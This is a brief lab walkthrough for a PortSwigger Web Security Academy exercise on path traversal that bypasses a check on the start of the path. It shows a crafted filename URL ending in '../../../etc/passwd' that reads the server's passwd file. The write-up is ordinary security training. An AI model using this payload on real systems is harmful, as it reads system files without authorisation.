# [File path traversal, validation of start of path](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)

> detailed document about path traversal [here](?file=portswigger%2Fbasic%2Fpath-traversal)

> Expected base folder

- open a product image in a new tab:

`https://xxx.web-security-academy.net/image?filename=/var/www/images/44.jpg`

- change the filename value to

`https://xxx.web-security-academy.net/image?filename=/var/www/images/../../../etc/passwd`

- check the response and change the view it to utf-8, it will have the content of a passwd file
